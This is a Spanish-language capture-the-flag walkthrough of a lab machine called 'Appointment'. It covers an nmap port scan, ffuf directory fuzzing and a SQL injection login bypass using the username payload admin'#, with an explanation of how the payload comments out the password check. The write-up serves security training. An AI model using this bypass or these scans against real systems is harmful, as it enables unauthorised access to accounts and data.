# Appointment

## 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -sCV -p- -Pn 10.129.157.169
```

**Resultado:**

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Login
```

* Puerto `80/tcp` abierto.
* Servidor web **Apache 2.4.38** sobre **Debian**.
* La web muestra un **panel de login**.

---

## 2. Enumeración

### Fuzzing de directorios

```bash
ffuf -u http://10.129.157.169/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Resultado:**

* Se encuentra `index.php`, correspondiente al panel de login.
* No se encuentran otros recursos relevantes.

---

## 3. Explotación

### SQL Injection

El formulario de login es vulnerable a **SQL Injection**.

Se utiliza como usuario:

```text
admin'#
```

El carácter `'` cierra la cadena de la consulta SQL y `#` hace que el resto de la consulta sea interpretado como un comentario, ignorando así la comprobación de contraseña.

Esto permite acceder al panel sin conocer la contraseña.

---

## 4. Post-Explotación

* Acceso conseguido mediante **SQL Injection**.
* No se requiere contraseña válida.

---

## 5. Flags / Evidencias

* Acceso al panel de administración conseguido.
* [Añadir aquí la flag o evidencia obtenida posteriormente.]

---

## Lessons Learned

* Enumerar siempre los puertos y servicios antes de atacar.
* El fuzzing permite descubrir archivos y endpoints ocultos.
* Los formularios de autenticación deben comprobarse frente a **SQL Injection**.
* `#` puede utilizarse como comentario en determinadas consultas SQL, dependiendo del DBMS.
